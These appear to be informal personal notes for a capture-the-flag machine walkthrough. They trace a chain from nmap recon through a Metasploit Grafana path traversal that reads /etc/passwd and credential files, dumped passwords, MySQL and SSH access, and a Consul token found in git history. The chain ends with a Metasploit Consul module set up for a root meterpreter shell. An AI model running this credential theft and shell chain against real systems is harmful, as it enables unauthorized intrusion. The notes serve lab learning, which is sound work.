Recon:
               nmap scan gives the result that 4 open ports 
	       22
               80
               3000
               3306

              We visit ambassaor.htb with 3000 port ie: http://ambassaor.htb:3000.which give us an login page "Grafana".
              msfconsole have a auxiliary module for grafana "grafana_plugin_traversal" which worked successfully and give as /etc/passwd
              changed file path to /etc/grafana/grafana.ini which dowl a config file which consist of username and password to login admin:messageInABottle685427
              changed file path to /var/lib/grafana/grafana.db since it contains grafana default credentials dowl a database file and
	      read it using sqlite3 filename
			   >.tables
			   >select * from data_source" which dumped another password dontStandSoCloseToMe63221!Me63221!
              using port 3306 accessing remote mysql "mysql -h ambassaodor.htb -u grafana -p dontStandSoCloseToMe63221!Me63221!"
                                                     developer:YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==
 				                     developer:anEnglishManInNewYork027468

Foothold: 
           ssh connection

           /opt/my-app has some logs 
                      >git log 
                      >git show 33a53ef9a207976d5ceceddc41a199558843bf3c
                                            https://www.consul.io/api-docs/acl/tokens
            curl --header "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5"    http://127.0.0.1:8500/v1/acl/token/self
            since port 8500 is running remotely we need to port forward to our machine. ssh -L 8500:0.0.0.0:8500 developer@Machine_IP
            msfconsole has a payload for consul so we used that and changeed some parametrs: set ACL_TOKEN bb03b43b-1d81-d62b-24b5-39540ee469b5
											     set RHOSTS 127.0.0.1
											     set SRVHOST (our vpn ip)
											     set LHOST (our vpn ip)
											     run
              we will get a root shell in meterpreter.
	     
Pwned.!!!
												  
